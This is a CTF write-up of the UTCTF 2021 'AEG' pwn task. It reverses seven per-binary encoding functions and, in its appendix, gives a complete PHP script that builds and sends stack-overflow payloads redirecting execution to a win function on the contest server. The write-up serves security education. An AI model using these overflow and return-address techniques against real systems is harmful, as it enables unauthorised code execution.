# AEG - UTCTF 2021 (pwn, 992p, 	30 solved)

## Introduction
AEG is a binary exploitation task.

A hostname and a port are given: `pwn.utctf.live:9997`. The service mistakenly
mentions it will generate 20 random binaries (only 10 are generated) and that
they should be solved within 60 seconds.

When pressing enter, an hexadecimal dump of the first binary is sent.

AEG stands for **A**utomatic **E**xploit **G**eneration.

## Reverse engineering
The dumped binary reads `0x3F` bytes from `stdin` with `fgets` and passes the
buffer to a function called `vuln`.

```c
char buf[0x40];
fgets(buf, sizeof(buf), stdin);
vuln(buf);
```

The `vuln` function retrieves the length of `buf`. It then calls functions
`encode1` to `encode7` that alter the buffer. The resulting buffer is copied
into a local variable that is too small.

```c
char local[0x2C];

int size = strlen(buf)

encode1(buf);
encode2(buf);
encode3(buf);
encode4(buf);
encode5(buf);
encode6(buf);
encode7(buf);

memcpy(local, buf, size);
```

A `win` function exists. It simply calls `exit(100)`.

Functions `encode1` to `encode7` are slightly different every time a new binary
is generated.

### `encode1`
`encode1` contains a single loop that xors the buffer with a single byte.

The byte is stored at `encode1 + 0x30`.

```c
for(size_t i = 0; i < 0x40; i++)
	buf[i] ^= KEY1;
```

### `encode2`
`encode2` shuffles the buffer in accordance to the indexes stored in the
`grouping1` array.

`grouping1` is stored at offset `0x1060`.

```c
char tmp[0x40];

for(size_t i = 0; i < 0x10; i++)
	for(size_t j = 0; j < 4; j++)
		tmp[i * 4 + j] = buf[grouping1[i] * 4 + j];

memcpy(buf, tmp, 0x40); // inlined
```

### `encode3`
`encode3` rotates the buffer left by `n` bytes.

The byte is stored at `encode3 + 0x16`.

```c
char tmp[0x40];

for(size_t i = 0; i < sizeof(tmp); i++) {
	size_t idx = (i + KEY3) % sizeof(tmp);
	tmp[i] = buf[idx];
}

memcpy(buf, tmp, 0x40); // inlined
```

### `encode4`
`encode4` is `encode1` with a different key.

### `encode5`
`encode5` contains a single loop that adds a single byte to every bytes of the
buffer. The byte can be negative.

The byte is stored at `encode5 + 0x30`. The byte at `encode5 + 0x2F` can be used
to determine if the byte is positive or negative (resulting in an `add` or `sub`
opcode).

```c
for(size_t i = 0; i < 0x40; i++)
	buf[i] += KEY5;
```

### `encode6`
`encode6` is `encode2` with a different key.

The key is `grouping2`, located at offset `0x10A0`.

### `encode7`
`encode7` is `encode3` with a different key.


## Exploitation
![
Infosuck-like comic in three panes depicting a character that represents the
author of this writeup. The character is frowning.
On the first pane the character ays "I spent hours reversing every decode
functions." followed by "Then, I wrote a script that reimplements them one by
one to exploit the binaries.".
On the second pane, the character says "He just used angr to solve everything.
Good thing I'm not a noob like that guy".
On the third pane, the character is silent and starts weeping.
](angr.png)

With every function reversed, it becomes possible to implement their invert and
call them in reverse order to mangle a string of character in such a way that
the binary will decode it back to the original string.

Applying this strategy to the 10 (not 20!) binaries from the remote server
prints the flag.

**Flag**: `utflag{exploit_machine_goes_brrrrrrrr}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "hexdump.php";
require_once "Process.php";
require_once "Socket.php";

const HOST  = "pwn.utctf.live";
const PORT  = 9997;
const DEBUG = true;

function unlut(string $str) : array
{
	$ret = array_fill(0, 0x10, -1);

	for($i = 0; $i < sizeof($ret); $i++) {
		$idx = unpack("V", substr($str, 4 * $i, 4))[1];
		assert(0 <= $idx);
		assert($idx < 0x10);
		assert(-1 === $ret[$idx]);

		$ret[$idx] = $i;
	}

	return $ret;
}

function encode(string $file) : string
{
	/* Find offsets */
	$offset = 0x656;
	$f = [];
	for($i = 1; $i <= 7; $i++) {
		$f[] = $offset;
		$offset = strpos($file, "\x5D\xC3", $offset) + 2;
	}

	/* Find win function */
	$offset = strpos($file, "\xC9\xC3", $offset) + 2; // main
	$offset = strpos($file, "\xC9\xC3", $offset) + 2; // win

	$payload  = str_repeat("A", 0x38);
	$payload .= pack("Q", 0x400000 + $offset);


	/* Decode keys */
	$key1 = unpack("c", $file[$f[0] + 0x30])[1]; // xor
	$key2 = unlut(substr($file, 0x00001060, 0x40)); // substitute
	$key3 = unpack("c", $file[$f[2] + 0x16])[1]; // add sub
	$key4 = unpack("c", $file[$f[3] + 0x30])[1]; // xor
	$key5 = unpack("c", $file[$f[4] + 0x30])[1]; // sub
	$key5 = "\xc2" === $file[$f[4] + 0x2F] ? $key5 : -$key5;
	$key6 = unlut(substr($file, 0x000010A0, 0x40)); // substitute
	$key7 = unpack("c", $file[$f[6] + 0x16])[1]; // add sub

	DEBUG && fprintf(STDERR, "key1: %02X\n", $key1);
	DEBUG && fprintf(STDERR, "key3: %02X\n", $key3);
	DEBUG && fprintf(STDERR, "key4: %02X\n", $key4);
	DEBUG && fprintf(STDERR, "key5: %02X\n", $key5);
	DEBUG && fprintf(STDERR, "key7: %02X\n", $key7);
	DEBUG && fprintf(STDERR, "memcpy\n%s", hexDump($payload));

	/* Undo encode7 */
	$tmp = str_pad("", 0x40);
	for($i = 0; $i < 0x40; $i++) {
		$idx = ($i + $key7) & 0x3F;
		$tmp[$i] = $payload[$idx];
	}
	$payload = $tmp;
	DEBUG && fprintf(STDERR, "encode%d\n%s", 7, hexDump($payload));

	/* Undo encode6 */
	$tmp = str_pad("", 0x40);
	for($i = 0; $i < 0x10; $i++) {
		for($j = 0; $j < 0x04; $j++) {
			$idx1 = $j + 4 * $i;
			$idx2 = $j + 4 * $key6[$i];
			$tmp[$idx1] = $payload[$idx2];
		}
	}
	$payload = $tmp;
	DEBUG && fprintf(STDERR, "encode%d\n%s", 6, hexDump($payload));

	/* Undo encode5 */
	for($i = 0; $i < 0x40; $i++) {
		$byte  = ord($payload[$i]);
		$byte -= $key5; // sometimes +, sometimes - ?
		$payload[$i] = chr(0xFF & $byte);
	}
	DEBUG && fprintf(STDERR, "encode%d\n%s", 5, hexDump($payload));

	/* Undo encode4 */
	for($i = 0; $i < 0x40; $i++) {
		$byte  = ord($payload[$i]);
		$byte ^= $key4;
		$payload[$i] = chr(0xFF & $byte);
	}
	DEBUG && fprintf(STDERR, "encode%d\n%s", 4, hexDump($payload));

	/* Undo encode3 */
	$tmp = str_pad("", 0x40);
	for($i = 0; $i < 0x40; $i++) {
		$idx = ($i + $key3) & 0x3F;
		$tmp[$i] = $payload[$idx];
	}
	$payload = $tmp;
	DEBUG && fprintf(STDERR, "encode%d\n%s", 3, hexDump($payload));

	/* Undo encode2 */
	$tmp = str_pad("", 0x40);
	for($i = 0; $i < 0x10; $i++) {
		for($j = 0; $j < 4; $j++) {
			$idx1 = $j + 4 * $i;
			$idx2 = $j + 4 * $key2[$i];
			$tmp[$idx1] = $payload[$idx2];
		}
	}
	$payload = $tmp;
	DEBUG && fprintf(STDERR, "encode%d\n%s", 2, hexDump($payload));

	/* Undo encode1 */
	for($i = 0; $i < 0x40; $i++) {
		$byte = ord($payload[$i]);
		$byte ^= $key1;
		$payload[$i] = chr(0xFF & $byte);
	}
	DEBUG && fprintf(STDERR, "encode%d\n%s", 1, hexDump($payload));

	return $payload;
}


printf("[*] Creating process\n");
$time = microtime(true);

$t = new SocketTube(HOST, PORT);

$t->expectLine("You will be given 10 randomly generated binaries.");
$t->expectLine("You have 60 seconds to solve each one.");
$t->expectLine("Press enter when you're ready for the first binary.");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$t->write("\n");

for($n = 0; $n < 10; $n++) {
	printf("%02d / 10\n", $n);

	/* Read file */
	$file = "";
	for($i = 0; $i <= 0x244; $i++) {
		$offset = sprintf("%08x:", $i * 0x10);
		$t->expect($offset);

		// read hex dump
		for($j = 0; $j < 8; $j++) {
			$t->expect(" ");
			$file .= chr(hexdec($t->read(2)));
			$file .= chr(hexdec($t->read(2)));
		}

		// discard ascii
		$t->readLine();
	}

	$t->expectLine("");
	$t->expectLine("");

	$t->expectLine("You have 60 seconds to provide input: ");

	$result = encode($file);
	$t->write($result);

	$t->expectLine("Process exited with return code 100");
}


dump:
printf("[!] Dumping...\n");
while($buffer = $t->read(4096))
	printf("%s\n", $buffer);
```
